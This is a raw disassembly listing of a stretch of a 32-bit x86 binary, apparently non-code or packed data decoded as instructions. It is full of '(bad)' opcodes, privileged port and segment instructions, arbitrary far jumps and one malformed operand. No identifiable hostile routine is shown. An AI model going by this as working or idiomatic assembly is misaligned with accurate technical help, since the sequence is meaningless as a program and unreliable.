  40d6d7:	popf   
  40d6d8:	shl    BYTE PTR [ebx+0x43908c5c],cl
  40d6de:	mov    esp,0xbce15764
  40d6e3:	xchg   DWORD PTR [ecx+0x3bddd6c8],ebp
  40d6e9:	retf   0xcb33
  40d6ec:	clc    
  40d6ed:	mov    bh,0xf3
  40d6ef:	shl    DWORD PTR [ecx+0x35],1
  40d6f2:	idiv   DWORD PTR [eax+0x4b868312]
  40d6f8:	xchg   esi,eax
  40d6f9:	pop    edi
  40d6fa:	sti    
  40d6fb:	sbb    cl,BYTE PTR [ebx+0x4]
  40d6fe:	jbe    0x40d6c9
  40d700:	xchg   DWORD PTR [ecx-0x48],edx
  40d703:	mov    WORD PTR [eax+0x5f],cs
  40d706:	pushf  
  40d707:	shl    DWORD PTR [ebx-0x1dca92f1],0xa7
  40d70e:	stos   BYTE PTR es:[edi],al
  40d70f:	fstp   TBYTE PTR [ecx+ebx*1+0x394475a2]
  40d716:	mov    ebx,fs
  40d718:	cli    
  40d719:	jnp    0x40d6a9
  40d71b:	xlat   BYTE PTR ds:[ebx]
  40d71c:	jp     0x40d742
  40d71e:	rcl    BYTE PTR [esi+0x28],1
  40d721:	loop   0x40d755
  40d723:	scas   al,BYTE PTR es:[edi]
  40d724:	xor    al,0xa7
  40d726:	sub    esi,ebx
  40d728:	into   
  40d729:	adc    BYTE PTR [eax+0x15],cl
  40d72c:	loop   0x40d772
  40d72e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d72f:	and    al,0x7b
  40d731:	sub    dh,BYTE PTR [ebx]
  40d733:	mov    ebp,0x19b29b84
  40d738:	add    BYTE PTR [edi+0x6ada3749],cl
  40d73e:	iret   
  40d73f:	stos   DWORD PTR es:[edi],eax
  40d740:	inc    ebx
  40d741:	jmp    0xb338:0x11adcba0
  40d748:	or     DWORD PTR [eax-0x4f],0xffffff85
  40d74c:	sub    ch,BYTE PTR [edi-0x5071e10a]
  40d752:	push   ecx
  40d753:	mov    al,0x5b
  40d755:	pop    esi
  40d756:	sbb    dh,0xae
  40d759:	pop    ds
  40d75a:	sbb    edi,DWORD PTR [edi-0x27f89782]
  40d760:	mov    dl,0xd8
  40d762:	push   ss
  40d763:	dec    DWORD PTR [eax+0x12533b1b]
  40d769:	fcomp  DWORD PTR [edi-0x1c67d987]
  40d76f:	lock push 0xffffffa0
  40d772:	out    0x9c,al
  40d774:	sub    DWORD PTR [esi-0x34deb339],ecx
  40d77a:	enter  0x9085,0x43
  40d77e:	push   0x42a79c3
  40d783:	xchg   ebx,eax
  40d784:	sub    ebx,DWORD PTR [edi+0x15]
  40d787:	iret   
  40d788:	xor    ebx,DWORD PTR [edi-0x58]
  40d78b:	scas   al,BYTE PTR es:[edi]
  40d78c:	jle    0x40d7b4
  40d78e:	pop    ds
  40d78f:	pop    es
  40d790:	jecxz  0x40d735
  40d792:	fcom   QWORD PTR [ecx-0x4c]
  40d795:	cs data16 cmc 
  40d798:	jge    0x40d7e8
  40d79a:	inc    ebx
  40d79b:	aas    
  40d79c:	scas   al,BYTE PTR es:[edi]
  40d79d:	mov    dl,0xef
  40d79f:	(bad)  
  40d7a1:	and    bl,0xad
  40d7a4:	xchg   ebx,eax
  40d7a5:	lds    ecx,FWORD PTR [esp+eiz*8+0x1e]
  40d7a9:	repz out 0xb2,eax
  40d7ac:	or     al,0x82
  40d7ae:	rcl    BYTE PTR [eax+0x54a54a08],0x4
  40d7b5:	push   ecx
  40d7b6:	rcr    DWORD PTR [edi*8-0x65c8e3e3],1
  40d7bd:	into   
  40d7be:	ror    ebx,0x4
  40d7c1:	jl     0x40d77c
  40d7c3:	in     eax,0xaa
  40d7c5:	and    ebp,DWORD PTR [edx]
  40d7c7:	pop    esi
  40d7c8:	fldenv [esi]
  40d7ca:	fsubr  DWORD PTR ds:0x60877067
  40d7d0:	adc    BYTE PTR [eax],dh
  40d7d2:	push   eax
  40d7d3:	hlt    
  40d7d4:	or     BYTE PTR [edi],ch
  40d7d6:	inc    ebp
  40d7d7:	inc    edx
  40d7d8:	or     al,BYTE PTR [edi]
  40d7da:	loop   0x40d77e
  40d7dc:	mov    cl,0x58
  40d7de:	xchg   BYTE PTR ds:0xef82699b,bl
  40d7e5:	mov    BYTE PTR ss:[ecx],dh
  40d7e8:	aas    
  40d7e9:	sub    ebp,DWORD PTR [eax]
  40d7eb:	inc    esp
  40d7ec:	gs popa 
  40d7ee:	mov    esp,0x3a92bf78
  40d7f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7f4:	push   0xa626f283
  40d7f9:	and    BYTE PTR [edi+0x65],ch
  40d7fc:	add    esp,DWORD PTR [esi-0x31]
  40d7ff:	mov    esi,0xc40e39da
  40d804:	(bad)  
  40d805:	dec    ecx
  40d806:	mov    esi,edi
  40d808:	js     0x40d7ed
  40d80a:	lods   al,BYTE PTR ds:[esi]
  40d80b:	xchg   ebp,eax
  40d80c:	pop    eax
  40d80d:	aas    
  40d80e:	xchg   ebx,eax
  40d80f:	sub    dl,dl
  40d811:	retf   
  40d812:	and    edi,DWORD PTR [esi*2+0x47583af8]
  40d819:	std    
  40d81a:	push   esp
  40d81b:	pop    esp
  40d81c:	xchg   esi,eax
  40d81d:	in     al,0x57
  40d81f:	push   eax
  40d820:	lahf   
  40d821:	dec    ecx
  40d822:	call   0x8ff4:0xdd15e5ab
  40d829:	retf   
  40d82a:	push   ebx
  40d82b:	int    0x41
  40d82d:	dec    ebp
  40d82e:	xor    eax,DWORD PTR [ebx-0x5d]
  40d831:	dec    ebp
  40d832:	jno    0x40d81d
  40d834:	cmp    eax,0x33d9bb9c
  40d839:	ror    BYTE PTR [ebx],1
  40d83b:	and    ebx,DWORD PTR [edx-0x53]
  40d83e:	sbb    BYTE PTR [eax+eax*4+0x45bb2b1b],bh
  40d845:	stc    
  40d846:	fcom   st(0)
  40d848:	push   edi
  40d849:	xor    edx,edi
  40d84b:	cmp    al,0x37
  40d84d:	hlt    
  40d84e:	or     BYTE PTR [edx-0x54],bl
  40d851:	cmp    BYTE PTR [ecx+0x1f],0x59
  40d855:	add    DWORD PTR [edi],edi
  40d857:	cmp    al,0x70
  40d859:	fnstsw WORD PTR [ecx+0x517dd417]
  40d85f:	sub    bh,dl
  40d861:	jnp    0x40d80f
  40d863:	xchg   esp,eax
  40d864:	std    
  40d865:	test   BYTE PTR es:[esi],bh
  40d868:	dec    ebp
  40d869:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d86a:	mov    ds:0x441340d5,eax
  40d86f:	cdq    
  40d870:	popa   
  40d871:	int    0xbe
  40d873:	in     eax,dx
  40d874:	inc    eax
  40d875:	test   al,0xed
  40d877:	and    DWORD PTR [edx-0x1c],edx
  40d87a:	fcomip st,st(6)
  40d87c:	mov    ?,ebx
  40d87e:	mov    ah,0x0
  40d880:	mov    bh,0xf5
  40d882:	dec    edi
  40d883:	rcr    BYTE PTR [edx],0xba
  40d886:	test   eax,0x9a29808b
  40d88b:	into   
  40d88c:	push   ecx
  40d88d:	mov    ds:0x37ae3faf,eax
  40d892:	aad    0xf4
  40d894:	inc    esi
  40d895:	adc    esp,eax
  40d897:	dec    esp
  40d898:	sbb    cl,ch
  40d89a:	add    al,0x73
  40d89c:	adc    esi,0xffffff9f
  40d89f:	xchg   edx,eax
  40d8a0:	scas   al,BYTE PTR es:[edi]
  40d8a1:	adc    edx,ebp
  40d8a3:	jecxz  0x40d86b
  40d8a5:	sahf   
  40d8a6:	ffree  st(4)
  40d8a8:	scas   al,BYTE PTR es:[edi]
  40d8a9:	sar    bl,0x9b
  40d8ac:	xchg   esi,eax
  40d8ad:	xlat   BYTE PTR ds:[ebx]
  40d8ae:	cmp    eax,0xa7cd7a67
  40d8b3:	bound  esi,QWORD PTR [ebx-0x5a]
  40d8b6:	xchg   esp,eax
  40d8b7:	adc    eax,0xcffaecdd
  40d8bc:	popa   
  40d8bd:	shr    BYTE PTR [esi],0x78
  40d8c0:	cmp    al,0x8a
  40d8c2:	aas    
  40d8c3:	int3   
  40d8c4:	dec    esp
  40d8c5:	dec    esi
  40d8c6:	push   es
  40d8c7:	push   esi
  40d8c8:	rol    BYTE PTR [ecx+0x1e],cl
  40d8cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8cc:	cli    
  40d8cd:	and    eax,0x77354d49
  40d8d2:	push   edi
  40d8d3:	fistp  WORD PTR [ebx]
  40d8d5:	cs dec ebp
  40d8d7:	in     al,0xe9
  40d8d9:	dec    bx
  40d8db:	(bad)  
  40d8dc:	rol    bh,0x13
  40d8df:	outs   dx,BYTE PTR ds:[esi]
  40d8e0:	call   DWORD PTR [edi-0x24]
  40d8e3:	aad    0x2c
  40d8e5:	shl    DWORD PTR [ebx+0x37d783a2],1
  40d8eb:	and    BYTE PTR [eax+ecx*4+0x57],cl
  40d8ef:	add    DWORD PTR [ebp+0x8],ebp
  40d8f2:	fist   WORD PTR [edx-0x38f63456]
  40d8f8:	pop    eax
  40d8f9:	sbb    esp,ebx
  40d8fb:	xchg   ecx,eax
  40d8fc:	mov    ebx,0x206f0d2e
  40d901:	mov    esp,0x6e86b1c9
  40d906:	sti    
  40d907:	push   ds
  40d908:	pop    es
  40d909:	xchg   ebx,eax
  40d90a:	mov    dl,0xd2
  40d90c:	mov    esi,DWORD PTR [ebx+0xfe9bb4f]
  40d912:	test   DWORD PTR [ebx],0xd05c402
  40d918:	jbe    0x40d900
  40d91a:	sbb    DWORD PTR [ecx+0x1255f9db],edx
  40d920:	shl    edx,1
  40d922:	dec    esi
  40d923:	jecxz  0x40d943
  40d925:	(bad)  
  40d926:	outs   dx,BYTE PTR ds:[esi]
  40d927:	cmp    al,0xea
  40d929:	add    BYTE PTR [edi+0x396a125e],dl
  40d92f:	mov    esp,0xe3ce8731
  40d934:	in     al,0x50
  40d936:	ds data16 (bad) 
  40d939:	(bad)  
  40d93a:	mov    ch,0x64
  40d93c:	inc    esp
  40d93d:	loope  0x40d998
  40d93f:	(bad)  
  40d940:	cmp    BYTE PTR [eax-0x459d18b2],dl
  40d946:	aaa    
  40d947:	(bad)  
  40d948:	mov    ch,0x14
  40d94a:	pop    ds
  40d94b:	or     eax,0x9621e2ac
  40d950:	or     eax,0x60cf574a
  40d955:	and    ah,BYTE PTR [esi]
  40d957:	je     0x40d905
  40d959:	(bad)  
  40d95a:	pusha  
  40d95b:	xor    dl,bh
  40d95d:	dec    edx
  40d95e:	pop    edi
  40d95f:	out    0x5e,al
  40d961:	and    ecx,eax
  40d963:	stos   DWORD PTR es:[edi],eax
  40d964:	loopne 0x40d982
  40d966:	push   es
  40d967:	ins    BYTE PTR es:[edi],dx
  40d968:	shr    DWORD PTR [edx+0xac75aea],1
  40d96e:	and    ebx,edi
  40d970:	bnd js 0x40d9a4
  40d973:	sub    eax,0x360e3db1
  40d978:	mov    eax,0x4285eaea
  40d97d:	dec    ecx
  40d97e:	cmp    dl,BYTE PTR [edx+ecx*2]
  40d981:	stos   BYTE PTR es:[edi],al
  40d982:	sar    ecx,cl
  40d984:	loop   0x40d98d
  40d986:	retf   
  40d987:	xchg   ecx,eax
  40d988:	jle    0x40d9c8
  40d98a:	push   esp
  40d98b:	setl   BYTE PTR [esi+0x32]
  40d98f:	sub    ch,BYTE PTR [edx+0xd]
  40d992:	sahf   
  40d993:	jge    0x40d954
  40d995:	(bad)  
  40d996:	push   edx
  40d997:	fadd   DWORD PTR [ebx+edi*1+0x45a741b3]
  40d99e:	push   0x1f
  40d9a0:	out    dx,eax
  40d9a1:	(bad)  
  40d9a2:	xlat   BYTE PTR ds:[ebx]
  40d9a3:	mov    ds:0x5493da6e,al
  40d9a8:	daa    
  40d9a9:	arpl   WORD PTR ds:0xadeb1d9e,di
  40d9af:	push   edx
  40d9b0:	out    0x5b,eax
  40d9b2:	nop
  40d9b3:	fidiv  DWORD PTR [edi-0x7e]
  40d9b6:	ss cli 
  40d9b8:	(bad)  
  40d9b9:	bnd jmp 0x480ddbd0
  40d9bf:	stos   DWORD PTR es:[edi],eax
  40d9c0:	sbb    DWORD PTR ds:0xf0b88731,edx
  40d9c6:	and    eax,0x14c41588
  40d9cb:	test   BYTE PTR [edi],dh
  40d9cd:	rcr    DWORD PTR [edx],1
  40d9cf:	retf   0x4e01
  40d9d2:	push   eax
  40d9d3:	push   edx
  40d9d4:	dec    ebx
  40d9d5:	inc    esp
  40d9d6:	add    eax,0x6d0d5a3d
  40d9db:	mov    ds:0xbe433e8a,al
  40d9e0:	shr    BYTE PTR [ebp-0x7b],cl
  40d9e3:	pop    esp
  40d9e4:	fisttp DWORD PTR ds:0x45e14147
  40d9ea:	adc    bh,BYTE PTR [edi-0x3e0a9317]
  40d9f0:	out    0xc6,al
  40d9f2:	pusha  
  40d9f3:	xchg   BYTE PTR [esi+0x21708ff8],dl
  40d9f9:	jns    0x40d993
  40d9fb:	test   al,0x16
  40d9fd:	pushf  
  40d9fe:	lods   eax,DWORD PTR ds:[esi]
  40d9ff:	dec    ecx
  40da00:	pop    ecx
  40da01:	ret    
  40da02:	mov    ebx,edx
  40da04:	(bad)  
  40da05:	adc    edi,DWORD PTR [esi]
  40da07:	jge    0x40d9b4
  40da09:	nop
  40da0a:	loope  0x40da16
  40da0c:	js     0x40da68
  40da0e:	(bad)  
  40da0f:	dec    edi
  40da10:	or     al,0x5b
  40da12:	add    dh,al
  40da14:	test   al,0xcc
  40da16:	call   0x50066626
  40da1b:	mov    ds:0x6a40a358,al
  40da20:	mov    ebx,0xd023be62
  40da25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da26:	sbb    eax,0xd7915340
  40da2b:	test   ecx,0x695a2559
  40da31:	(bad)  
  40da32:	icebp  
  40da33:	adc    DWORD PTR [ebx],esi
  40da35:	add    esi,esi
  40da37:	dec    ecx
  40da38:	seto   BYTE PTR [eax-0x2]
  40da3c:	xchg   esi,eax
  40da3d:	dec    ebp
  40da3e:	in     eax,dx
  40da3f:	loope  0x40d9c7
  40da41:	(bad)  
  40da42:	jp     0x40d9cf
  40da44:	stos   BYTE PTR es:[edi],al
  40da45:	jnp    0x40da4f
  40da47:	div    BYTE PTR [eax-0xb2aa213]
  40da4d:	cmp    al,0x30
  40da4f:	and    BYTE PTR [edi],bh
  40da51:	js     0x40da0e
  40da53:	xor    eax,0x774420b2
  40da58:	int3   
  40da59:	pop    ds
  40da5a:	xchg   edi,eax
  40da5b:	popf   
  40da5c:	mov    cl,0x56
  40da5e:	int    0xa6
  40da60:	mov    esi,ebp
  40da62:	sbb    DWORD PTR [esi],edi
  40da64:	mov    cl,0xcd
  40da66:	in     eax,0x95
  40da68:	inc    esi
  40da69:	ret    
  40da6a:	loop   0x40da0e
  40da6c:	mov    ch,0xed
  40da6e:	retf   0x671b
  40da71:	push   es
  40da72:	inc    esp
  40da73:	aaa    
  40da74:	mov    bl,0xe1
  40da76:	sti    
  40da77:	jle    0x40dade
  40da79:	arpl   si,dx
  40da7b:	xchg   ebx,eax
  40da7c:	or     al,0xf4
  40da7e:	and    BYTE PTR [edx+esi*2+0x5b052d70],al
  40da85:	pop    edi
  40da86:	lds    ebp,FWORD PTR [edx]
  40da88:	sub    DWORD PTR ds:0xb1b13297,eax
  40da8e:	sbb    eax,0xd61c0d76
  40da93:	stos   BYTE PTR es:[edi],al
  40da94:	pop    edx
  40da95:	mov    dl,0xa4
  40da97:	outs   dx,DWORD PTR ds:[esi]
  40da98:	mov    cl,0xcc
  40da9a:	inc    esi
  40da9b:	mov    dh,0xe2
  40da9d:	test   BYTE PTR [ebx-0x12],al
  40daa0:	arpl   sp,dx
  40daa2:	add    bh,BYTE PTR [esi-0x4e66e36f]
  40daa8:	pop    ds
  40daa9:	xor    cl,0x5c
  40daac:	fisttp QWORD PTR [edi+0x70]
  40daaf:	lock retf 0x6b00
  40dab3:	test   DWORD PTR [edx+0x2d0a62f1],ebx
  40dab9:	sar    BYTE PTR [ebp+0x2e],1
  40dabc:	xchg   esp,eax
  40dabd:	test   al,0x3f
  40dabf:	push   esp
  40dac0:	daa    
  40dac1:	cs (bad) 
  40dac4:	ds stos DWORD PTR es:[edi],eax
  40dac6:	inc    ebp
  40dac7:	aam    0x81
  40dac9:	add    eax,0x76df5723
  40dace:	adc    esp,DWORD PTR [eax+0x64]
  40dad1:	popa   
  40dad2:	dec    ebx
  40dad3:	popf   
  40dad4:	mov    al,0x7a
  40dad6:	daa    
  40dad7:	cmp    bh,ah
  40dad9:	xchg   ebp,eax
  40dada:	jmp    0x6ebe:0xcf91d225
  40dae1:	push   cs
  40dae2:	out    0x7d,eax
  40dae4:	sbb    al,BYTE PTR [eax+0x52530f1a]
  40daea:	(bad)  
  40daeb:	into   
  40daec:	pop    edi
  40daed:	ds xor al,0x83
  40daf0:	jge    0x40dac2
  40daf2:	hlt    
  40daf3:	sbb    BYTE PTR [edi],bh
  40daf5:	cmp    al,0xdf
  40daf7:	and    ah,BYTE PTR [eax-0x70]
  40dafa:	cmps   DWORD PTR gs:[si],DWORD PTR es:[di]
  40dafd:	pop    es
  40dafe:	lods   al,BYTE PTR ds:[esi]
  40daff:	in     al,dx
  40db00:	mov    eax,0x22617b06
  40db05:	push   edi
  40db06:	(bad)  
  40db07:	call   0x93dd:0x87ccbb76
  40db0e:	add    DWORD PTR [ebx+0x13],eax
  40db11:	and    al,0xa2
  40db13:	fnstsw WORD PTR [ebx+0x6cb1595c]
  40db19:	push   esp
  40db1a:	ins    DWORD PTR es:[edi],dx
  40db1b:	stc    
  40db1c:	dec    ecx
  40db1d:	mov    edx,0xbd56911
  40db22:	add    ebx,DWORD PTR [eax-0x47]
  40db25:	repnz stos DWORD PTR es:[edi],eax
  40db27:	cmp    BYTE PTR [esi+0x600407fe],cl
  40db2d:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db2f:	add    ah,al
  40db31:	jno    0x40daeb
  40db33:	sbb    dl,BYTE PTR [ebx+0x67833580]
  40db39:	dec    ebp
  40db3a:	out    0xeb,eax
  40db3c:	mov    bl,BYTE PTR [ebp+0x5]
  40db3f:	ins    BYTE PTR es:[edi],dx
  40db40:	nop
  40db41:	dec    edx
  40db42:	outs   dx,DWORD PTR ds:[esi]
  40db43:	xor    ch,BYTE PTR [ecx+0x5e]
  40db46:	add    DWORD PTR [eax+0x9],esi
  40db49:	(bad)  
  40db4a:	fst    QWORD PTR [ecx-0x6d]
  40db4d:	dec    ebx
  40db4e:	add    al,0x43
  40db50:	es scas al,BYTE PTR es:[edi]
  40db52:	and    al,0xd2
  40db54:	mul    DWORD PTR [edi-0x63]
  40db57:	jg     0x40db10
  40db59:	push   0x36
  40db5b:	test   eax,0xb41ee7f2
  40db60:	pop    eax
  40db61:	(bad)  
  40db62:	xchg   ebp,eax
  40db63:	or     bh,dl
  40db65:	inc    ebx
  40db66:	clts   
  40db68:	add    DWORD PTR [edx],ebx
  40db6a:	pop    ss
  40db6b:	xchg   esp,eax
  40db6c:	pop    ds
  40db6d:	mov    esi,0x9cebf40b
  40db72:	(bad)  
  40db73:	mov    esi,0x76abde9c
  40db78:	ja     0x40db30
  40db7a:	outs   dx,DWORD PTR ds:[esi]
  40db7b:	fistp  QWORD PTR [ebx-0x54cf0496]
  40db81:	pop    ss
  40db82:	adc    bh,BYTE PTR es:[ebp-0x46]
  40db86:	gs (bad) 
  40db88:	sub    dl,BYTE PTR [eax]
  40db8a:	fild   DWORD PTR [edi+0x2780e7d7]
  40db90:	jb     0x40dbae
  40db92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db93:	jne    0x40dbaa
  40db95:	mov    al,ds:0xce87a3ff
  40db9a:	mov    WORD PTR [ebp-0x3d1f44a5],ss
  40dba0:	pop    edi
  40dba1:	in     al,dx
  40dba2:	push   edi
  40dba3:	add    al,0x60
  40dba5:	and    DWORD PTR [ebp-0x258fdb7],eax
  40dbab:	in     eax,dx
  40dbac:	and    al,0xe4
  40dbae:	jmp    0x999c0108
  40dbb3:	sub    ebp,edx
  40dbb5:	xchg   esp,eax
  40dbb6:	adc    BYTE PTR [edx*4-0x13e9670b],dl
  40dbbd:	retf   
  40dbbe:	pop    esp
  40dbbf:	retf   
  40dbc0:	dec    edx
  40dbc1:	imul   eax,DWORD PTR [ebp+0xe],0xfe2cdef4
  40dbc8:	cmp    al,0xac
  40dbca:	or     DWORD PTR [ecx+0x1f92058c],0x859c4a22
  40dbd4:	imul   ebp,DWORD PTR [eax+ebp*1-0x7d],0x50ca0220
  40dbdc:	ins    DWORD PTR es:[edi],dx
  40dbdd:	sbb    ah,BYTE PTR [eax-0x15]
  40dbe0:	cli    
  40dbe1:	lods   al,BYTE PTR ds:[esi]
  40dbe2:	fmul   DWORD PTR [ebp-0x51]
  40dbe5:	jae    0x40db79
  40dbe7:	dec    edx
  40dbe8:	out    dx,al
  40dbe9:	and    BYTE PTR [ebx+eax*8+0x756d24fd],cl
  40dbf0:	push   cs
  40dbf1:	or     al,0x23
  40dbf3:	xchg   edi,eax
  40dbf4:	or     BYTE PTR [edi-0x48e29ad6],ah
  40dbfa:	lock mov bl,0x38
  40dbfd:	sub    al,0x7
  40dbff:	int3   
  40dc00:	add    eax,0xdc0681ad
  40dc05:	adc    al,0xda
  40dc07:	daa    
  40dc08:	and    ebx,DWORD PTR [ebx+0x5b5f66b9]
  40dc0e:	popf   
  40dc0f:	cli    
  40dc10:	or     DWORD PTR [edi-0x58e06536],ebp
  40dc16:	fcom   st(4)
  40dc18:	sti    
  40dc19:	ins    DWORD PTR es:[edi],dx
  40dc1a:	pop    ss
  40dc1b:	call   0x99fa:0xdbbb8406
  40dc22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc23:	leave  
  40dc24:	imul   esi,esp,0xc71466ae
  40dc2a:	rol    DWORD PTR [esi-0x62],0x9a
  40dc2e:	test   BYTE PTR [ebx],ah
  40dc30:	mov    bh,0x50
  40dc32:	cmp    bl,BYTE PTR [esi+0x5f]
  40dc35:	xor    BYTE PTR [ebp-0x64],0xf4
  40dc39:	adc    DWORD PTR [esi],eax
  40dc3b:	sub    bh,dh
  40dc3d:	es pop es
  40dc3f:	adc    DWORD PTR [esi+0x27],esi
  40dc42:	ja     0x40dc2c
  40dc44:	loopne 0x40dc23
  40dc46:	jmp    0xaaa7f993
  40dc4b:	dec    edx
  40dc4c:	ret    0xaf2a
  40dc4f:	fimul  WORD PTR [esi+eax*8-0x32]
  40dc53:	shl    BYTE PTR [esi+0x4753498a],1
  40dc59:	fbld   TBYTE PTR [ebx-0x31]
  40dc5c:	xchg   esp,eax
  40dc5d:	mov    eax,ds:0xc9ea20fe
  40dc62:	pop    ebx
  40dc63:	shl    esp,cl
  40dc65:	clc    
  40dc66:	daa    
  40dc67:	das    
  40dc68:	(bad)  
  40dc6a:	pop    esp
  40dc6b:	fsubr  DWORD PTR [ecx]
  40dc6d:	pop    edi
  40dc6e:	jno    0x40dc08
  40dc70:	dec    esi
  40dc71:	mov    ah,0x71
  40dc73:	(bad)  
  40dc74:	cwde   
  40dc75:	add    esp,DWORD PTR [ebp+0x7a340e18]
  40dc7b:	cmp    al,0xb4
  40dc7d:	out    dx,al
  40dc7e:	jo     0x40dc53
  40dc80:	mov    ds:0xeaf8bd92,al
  40dc85:	sti    
  40dc86:	push   ecx
  40dc87:	adc    bl,BYTE PTR [esi+0x79]
  40dc8a:	gs mov dl,0xf
  40dc8d:	jbe    0x40dcf3
  40dc8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc90:	dec    ecx
  40dc91:	popa   
  40dc92:	jl     0x40dce7
  40dc94:	aas    
  40dc95:	scas   eax,DWORD PTR es:[edi]
  40dc96:	(bad)  
  40dc97:	outs   dx,DWORD PTR es:[esi]
  40dc99:	inc    esp
  40dc9a:	sbb    eax,0xf72d7b9a
  40dc9f:	xor    bl,BYTE PTR [edx]
  40dca1:	(bad)  
  40dca3:	fcmovnu st,st(0)
  40dca5:	dec    ebx
  40dca6:	loop   0x40dcd5
  40dca8:	mov    bl,0xe9
  40dcaa:	fnstenv [eax+0x66]
  40dcad:	idiv   DWORD PTR ss:[ebp+0x753d7592]
  40dcb4:	outs   dx,BYTE PTR ds:[esi]
  40dcb5:	je     0x40dcf4
  40dcb7:	rcr    DWORD PTR [esi+0x5f],1
  40dcba:	or     eax,0x66768b06
  40dcbf:	mov    ebx,0xea9fa413
  40dcc4:	stos   BYTE PTR es:[edi],al
  40dcc5:	clc    
  40dcc6:	mov    al,0xa9
  40dcc8:	inc    ecx
  40dcc9:	push   ebp
  40dcca:	xchg   esi,eax
  40dccb:	inc    edx
  40dccc:	mov    ch,0x9c
  40dcce:	xor    al,0x74
  40dcd0:	popa   
  40dcd1:	push   ss
  40dcd2:	jne    0x40dd2e
  40dcd4:	mov    ecx,0x18afe657
  40dcd9:	sub    al,0x69
  40dcdb:	(bad)  
  40dcdc:	aad    0x55
  40dcde:	push   ss
  40dcdf:	cmovns ebx,DWORD PTR [ebx]
  40dce2:	mov    ebp,0x1e1b2e18
  40dce7:	(bad)  
  40dce8:	ins    BYTE PTR es:[edi],dx
  40dce9:	mov    dh,0xeb
  40dceb:	push   es
  40dcec:	shl    DWORD PTR [eax-0x53],0xc5
  40dcf0:	push   eax
  40dcf1:	leave  
  40dcf2:	and    BYTE PTR [edi-0x79c2cd2c],dl
  40dcf8:	test   eax,0x9082aa0c
  40dcfd:	mov    ds:0xdd6edacf,al
  40dd02:	ss inc esi
  40dd04:	dec    eax
  40dd05:	loope  0x40dcd4
  40dd07:	mov    dl,0x13
  40dd09:	cmp    BYTE PTR [edx],dh
  40dd0b:	xor    bh,0x1c
  40dd0e:	jnp    0x40dcec
  40dd10:	mov    ds:0x40301014,eax
  40dd15:	pop    ebp
  40dd16:	shl    BYTE PTR [ecx+0x4ae3e9f7],1
  40dd1c:	arpl   WORD PTR [edx-0x5fa623b3],di
  40dd22:	stc    
  40dd23:	jle    0x40dd95
  40dd25:	(bad)  
  40dd26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd27:	mov    eax,0x5a1b2a96
  40dd2c:	jne    0x40dd7b
  40dd2e:	inc    esp
  40dd2f:	add    BYTE PTR [ecx-0x3bda0282],dl
  40dd35:	or     ebx,DWORD PTR [edx-0x7e]
  40dd38:	std    
  40dd39:	sbb    al,0xcb
  40dd3b:	mov    eax,ds:0xf855966b
  40dd40:	sbb    DWORD PTR [edx+0x58],ebx
  40dd43:	popf   
  40dd44:	sbb    ah,bh
  40dd46:	inc    esi
  40dd47:	xor    bh,BYTE PTR ds:0x8d006129
  40dd4d:	xor    BYTE PTR [edi-0x5608163c],cl
  40dd53:	leave  
  40dd54:	sub    BYTE PTR ds:[esi+0x53],0x99
  40dd59:	sahf   
  40dd5a:	dec    eax
  40dd5b:	cdq    
  40dd5c:	cmp    bl,BYTE PTR [edi+0x56]
  40dd5f:	retf   0xc5e6
  40dd62:	aaa    
  40dd63:	loop   0x40dd5a
  40dd65:	push   esp
  40dd66:	mov    BYTE PTR [edi+0x698ce086],bl
  40dd6c:	jle    0x40dd1a
  40dd6e:	and    al,0xb6
  40dd70:	fsubr  QWORD PTR [ecx-0x3b18e496]
  40dd76:	pop    eax
  40dd77:	jae    0x40dd84
  40dd79:	cmc    
  40dd7a:	add    dl,BYTE PTR [esi+0x37]
  40dd7d:	adc    dh,BYTE PTR [esi+0x35d216c1]
  40dd83:	outs   dx,BYTE PTR ds:[esi]
  40dd84:	ficomp DWORD PTR [ebp+0x45214756]
  40dd8a:	(bad)
  40dd8d:	cmp    bh,BYTE PTR [ebx+0x988dcfc]
  40dd93:	into   
  40dd94:	sub    al,0x66
  40dd96:	fcomip st,st(2)
  40dd98:	lahf   
  40dd99:	loopne 0x40dd1d
  40dd9b:	popa   
  40dd9c:	push   0x37ef9a2c
  40dda1:	or     al,0xdc
  40dda3:	std    
  40dda4:	rcl    BYTE PTR [ebx+0x2],cl
  40dda7:	sub    eax,0xdde1d19
  40ddac:	jns    0x40de09
  40ddae:	adc    BYTE PTR [esi-0x5ab54224],bh
  40ddb4:	jmp    0x6323:0x2e1de755
  40ddbb:	fisttp DWORD PTR [esi+0x34b62cb2]
  40ddc1:	xchg   esp,eax
  40ddc2:	adc    eax,0x4b4f7a07
  40ddc7:	scas   al,BYTE PTR es:[edi]
  40ddc8:	dec    esi
  40ddc9:	sbb    ah,0x67
  40ddcc:	mov    ebp,DWORD PTR [ecx-0x78ea0ac4]
  40ddd2:	push   esi
  40ddd3:	mov    bh,BYTE PTR [edi+0x232fe978]
  40ddd9:	jg     0x40ddab
  40dddb:	add    eax,0x48a22f15
  40dde0:	in     al,dx
  40dde1:	pop    DWORD PTR [eax]
  40dde3:	mov    bh,bh
  40dde5:	je     0x40de5f
  40dde7:	aam    0x11
  40dde9:	push   ecx
  40ddea:	dec    eax
  40ddeb:	push   ebp
  40ddec:	dec    DWORD PTR [ebp-0x4e7b3769]
  40ddf2:	fcmovnb st,st(3)
  40ddf4:	pop    es
  40ddf5:	mov    cl,BYTE PTR [eax]
  40ddf7:	lods   eax,DWORD PTR ds:[esi]
  40ddf8:	repnz mov al,0x2f
  40ddfb:	jge    0x40dde8
  40ddfd:	sub    esi,DWORD PTR [ebp-0x4d]
  40de00:	xlat   BYTE PTR ds:[ebx]
  40de01:	shl    DWORD PTR [edx+ebp*4],cl
  40de04:	sbb    ebx,DWORD PTR [ecx+edx*4-0x24]
  40de08:	inc    edx
  40de09:	mov    dl,0xec
  40de0b:	xor    BYTE PTR [ebp-0x4c664fa4],0xf5
  40de12:	and    dh,BYTE PTR [ebx]
  40de14:	jb     0x40de2e
  40de16:	jno    0x40de1d
